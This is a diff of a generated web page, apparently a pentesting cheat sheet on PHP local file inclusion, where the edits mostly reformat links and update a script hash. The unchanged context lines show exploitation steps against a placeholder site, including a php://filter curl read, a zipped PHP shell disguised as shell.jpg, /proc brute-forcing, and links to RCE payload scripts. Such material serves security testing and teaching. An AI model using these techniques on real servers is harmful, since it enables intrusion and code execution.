@@ -16,7 +16,7 @@
 <link rel="icon" href="/favicon.png" type="image/x-icon">
 <link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
   <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.c3b45b6301b51f548f0398109b6e109d45abf1314e421f8ba62cf6f72646f958.js" integrity="sha256-w7RbYwG1H1SPA5gQm24QnUWr8TFOQh&#43;Lpiz29yZG&#43;Vg=" crossorigin="anonymous"></script>
+  <script defer src="/en.search.min.4e979c41ea1da3eadea6cff7d8575b0664a8627f9c4b12e833490d3df55a9f7b.js" integrity="sha256-TpecQeodo&#43;reps/32FdbBmSoYn&#43;cSxLoM0kNPfVan3s=" crossorigin="anonymous"></script>
 
   <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
 
@@ -81,10 +81,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-  
-    
-  
-
 
 
 <ul class="book-languages">
@@ -98,12 +94,6 @@ https://github.com/alex-shpak/hugo-book
     </label>
 
     <ul>
-      
-      <li>
-        <a href="https://www.grayhatfreelancing.com/ru/">
-          Ukrainian
-        </a>
-      </li>
       
     </ul>
   </li>
@@ -1487,14 +1477,10 @@ https://github.com/alex-shpak/hugo-book
   <a class="anchor" href="#tools">#</a>
 </h2>
 <ul>
-<li>
-  <a href="https://github.com/P0cL4bs/Kadimus">Kadimus - https://github.com/P0cL4bs/Kadimus</a></li>
-<li>
-  <a href="https://github.com/D35m0nd142/LFISuite">LFISuite - https://github.com/D35m0nd142/LFISuite</a></li>
-<li>
-  <a href="https://github.com/kurobeats/fimap">fimap - https://github.com/kurobeats/fimap</a></li>
-<li>
-  <a href="https://github.com/lightos/Panoptic">panoptic - https://github.com/lightos/Panoptic</a></li>
+<li><a href="https://github.com/P0cL4bs/Kadimus">Kadimus - https://github.com/P0cL4bs/Kadimus</a></li>
+<li><a href="https://github.com/D35m0nd142/LFISuite">LFISuite - https://github.com/D35m0nd142/LFISuite</a></li>
+<li><a href="https://github.com/kurobeats/fimap">fimap - https://github.com/kurobeats/fimap</a></li>
+<li><a href="https://github.com/lightos/Panoptic">panoptic - https://github.com/lightos/Panoptic</a></li>
 </ul>
 <h2 id="basic-lfi">
   Basic LFI
@@ -1584,8 +1570,7 @@ https://github.com/alex-shpak/hugo-book
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>./kadimus -u <span style="color:#e6db74">&#34;http://example.com/index.php?page=vuln&#34;</span> -S <span style="color:#f92672">-f</span> <span style="color:#e6db74">&#34;index.php%00&#34;</span> -O index.php --parameter page 
 </span></span><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php&#34;</span> | base64 -d &gt; index.php
-</span></span></code></pre></div><p>Also there is a way to turn the <code>php://filter</code> into a full RCE. Use 
-  <a href="./LFI2RCE.py">LFI2RCE.py</a> to generate a custom payload.</p>
+</span></span></code></pre></div><p>Also there is a way to turn the <code>php://filter</code> into a full RCE. Use <a href="./LFI2RCE.py">LFI2RCE.py</a> to generate a custom payload.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># vulnerable file: index.php</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># vulnerable parameter: file</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># executed command: id</span>
@@ -1603,8 +1588,7 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>mv payload<span style="color:#f92672">.</span>zip shell<span style="color:#f92672">.</span>jpg;
 </span></span><span style="display:flex;"><span>rm payload<span style="color:#f92672">.</span>php
 </span></span></code></pre></div><ol start="3">
-<li>Upload the archive and access the file using the wrappers: 
-  <a href="http://example.com/index.php?page=zip://shell.jpg%23payload.php">http://example.com/index.php?page=zip://shell.jpg%23payload.php</a></li>
+<li>Upload the archive and access the file using the wrappers: <a href="http://example.com/index.php?page=zip://shell.jpg%23payload.php">http://example.com/index.php?page=zip://shell.jpg%23payload.php</a></li>
 </ol>
 <h3 id="wrapper-data">
   Wrapper data://
@@ -1659,8 +1643,7 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 <ol>
 <li>Upload a lot of shells (for example : 100)</li>
-<li>Include 
-  <a href="http://example.com/index.php?page=/proc/$PID/fd/$FD">http://example.com/index.php?page=/proc/$PID/fd/$FD</a>, with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)</li>
+<li>Include <a href="http://example.com/index.php?page=/proc/$PID/fd/$FD">http://example.com/index.php?page=/proc/$PID/fd/$FD</a>, with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)</li>
 </ol>
 <h2 id="lfi-to-rce-via-procselfenviron">
   LFI to RCE via /proc/self/environ
@@ -1726,10 +1709,8 @@ https://github.com/alex-shpak/hugo-book
 <blockquote>
 <p>By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.</p>
 </blockquote>
-<p>Use the script phpInfoLFI.py (also available at 
-  <a href="https://www.insomniasec.com/downloads/publications/phpinfolfi.py">https://www.insomniasec.com/downloads/publications/phpinfolfi.py</a>)</p>
-<p>Research from 
-  <a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a></p>
+<p>Use the script phpInfoLFI.py (also available at <a href="https://www.insomniasec.com/downloads/publications/phpinfolfi.py">https://www.insomniasec.com/downloads/publications/phpinfolfi.py</a>)</p>
+<p>Research from <a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a></p>
 <h2 id="lfi-to-rce-via-controlled-log-file">
   LFI to RCE via controlled log file
   <a class="anchor" href="#lfi-to-rce-via-controlled-log-file">#</a>
@@ -1828,42 +1809,24 @@ If SSH is active check which user is being used <code>/proc/self/status</code> a
   <a class="anchor" href="#references">#</a>
 </h2>
 <ul>
-<li>
-  <a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">OWASP LFI</a></li>
-<li>
-  <a href="https://highon.coffee/blog/lfi-cheat-sheet/">HighOn.coffee LFI Cheat</a></li>
-<li>
-  <a href="https://l.avala.mp/?p=241">Turning LFI to RFI</a></li>
-<li>
-  <a href="http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html">Is PHP vulnerable and under what conditions?</a></li>
-<li>
-  <a href="https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/">Upgrade from LFI to RCE via PHP Sessions</a></li>
-<li>
-  <a href="http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html">Local file inclusion tricks</a></li>
-<li>
-  <a href="https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a">CVV #1: Local File Inclusion - SI9INT</a></li>
-<li>
-  <a href="http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html">Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos</a></li>
-<li>
-  <a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017">Baby^H Master PHP 2017 by @orangetw</a></li>
-<li>
-  <a href="https://rdot.org/forum/showthread.php?t=4379">Чтение файлов =&gt; unserialize !</a></li>
-<li>
-  <a href="https://blog.ripstech.com/2018/new-php-exploitation-technique/">New PHP Exploitation Technique - 14 Aug 2018 by Dr. Johannes Dahse</a></li>
-<li>
-  <a href="https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It%27s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf">It&rsquo;s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas</a></li>
-<li>
-  <a href="https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a">CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018</a></li>
-<li>
-  <a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html?m=1">Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction</a></li>
-<li>
-  <a href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/">PHP LFI with Nginx Assistance</a></li>
-<li>
-  <a href="https://gynvael.coldwind.pl/?id=376">PHP LFI to arbitrary code execution via rfc1867 file upload temporary files (EN) - gynvael.coldwind - 2011-03-18</a></li>
-<li>
-  <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters">LFI2RCE via PHP Filters - HackTricks</a></li>
-<li>
-  <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Solving &ldquo;includer&rsquo;s revenge&rdquo; from hxp ctf 2021 without controlling any files - @loknop</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">OWASP LFI</a></li>
+<li><a href="https://highon.coffee/blog/lfi-cheat-sheet/">HighOn.coffee LFI Cheat</a></li>
+<li><a href="https://l.avala.mp/?p=241">Turning LFI to RFI</a></li>
+<li><a href="http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html">Is PHP vulnerable and under what conditions?</a></li>
+<li><a href="https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/">Upgrade from LFI to RCE via PHP Sessions</a></li>
+<li><a href="http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html">Local file inclusion tricks</a></li>
+<li><a href="https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a">CVV #1: Local File Inclusion - SI9INT</a></li>
+<li><a href="http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html">Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos</a></li>
+<li><a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017">Baby^H Master PHP 2017 by @orangetw</a></li>
+<li><a href="https://rdot.org/forum/showthread.php?t=4379">Чтение файлов =&gt; unserialize !</a></li>
+<li><a href="https://blog.ripstech.com/2018/new-php-exploitation-technique/">New PHP Exploitation Technique - 14 Aug 2018 by Dr. Johannes Dahse</a></li>
+<li><a href="https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It%27s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf">It&rsquo;s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas</a></li>
+<li><a href="https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a">CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018</a></li>
+<li><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html?m=1">Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction</a></li>
+<li><a href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/">PHP LFI with Nginx Assistance</a></li>
+<li><a href="https://gynvael.coldwind.pl/?id=376">PHP LFI to arbitrary code execution via rfc1867 file upload temporary files (EN) - gynvael.coldwind - 2011-03-18</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters">LFI2RCE via PHP Filters - HackTricks</a></li>
+<li><a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Solving &ldquo;includer&rsquo;s revenge&rdquo; from hxp ctf 2021 without controlling any files - @loknop</a></li>
 </ul>
 </article>
  
